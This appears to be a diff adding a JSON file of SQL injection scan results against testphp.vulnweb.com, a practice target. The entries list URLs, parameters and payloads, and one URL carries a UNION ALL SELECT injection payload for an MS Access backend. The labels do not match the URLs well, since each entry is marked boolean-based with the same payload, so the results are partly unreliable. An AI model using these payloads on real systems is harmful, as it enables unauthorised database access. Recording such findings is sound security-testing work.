@@ -1,0 +1,26 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com/redir.php?r=http://b3.zcubes.com/v.aspx?mid=12462931",
+        "parameter": "id",
+        "http_method": "GET",
+        "sql_injection_type": "boolean-based",
+        "title": "OR",
+        "payload": "id=-5096"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/redir.php?r=https://www.facebook.com/photo/?fbid=958850715497918&set=ecnf.100041189958780",
+        "parameter": "id",
+        "http_method": "GET",
+        "sql_injection_type": "boolean-based",
+        "title": "OR",
+        "payload": "id=-5096"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=-2418%20UNION%20ALL%20SELECT%20NULL%2CCHR%28113%29%26CHR%28120%29%26CHR%28112%29%26CHR%28106%29%26CHR%28113%29%26%28IIF%28VAL%28CVAR%281%29%29%3D1%2C1%2C0%29%29%26CHR%28113%29%26CHR%28112%29%26CHR%28107%29%26CHR%28106%29%26CHR%28113%29%2CNULL%20FROM%20MSysAccessObjects%16",
+        "parameter": "id",
+        "http_method": "GET",
+        "sql_injection_type": "boolean-based",
+        "title": "OR",
+        "payload": "id=-5096"
+    }
+]
